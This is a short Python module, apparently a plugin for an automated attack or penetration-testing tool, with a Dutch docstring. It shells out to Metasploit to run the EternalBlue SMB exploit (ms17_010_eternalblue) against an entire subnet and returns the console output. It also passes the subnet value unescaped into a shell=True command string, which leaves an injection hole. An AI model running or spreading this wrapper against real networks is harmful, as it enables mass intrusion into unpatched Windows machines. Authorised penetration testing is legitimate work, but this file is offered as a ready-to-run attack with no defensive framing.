# metasploit_exploit.py
def run(subnet, interface):
    """Voer een Metasploit-exploit uit."""
    try:
        cmd = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {subnet}; run; exit'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return [{"target": subnet, "exploit": "ms17_010_eternalblue", "result": result.stdout}]
    except Exception as e:
        return [{"target": subnet, "result": f"Error: {e}"}]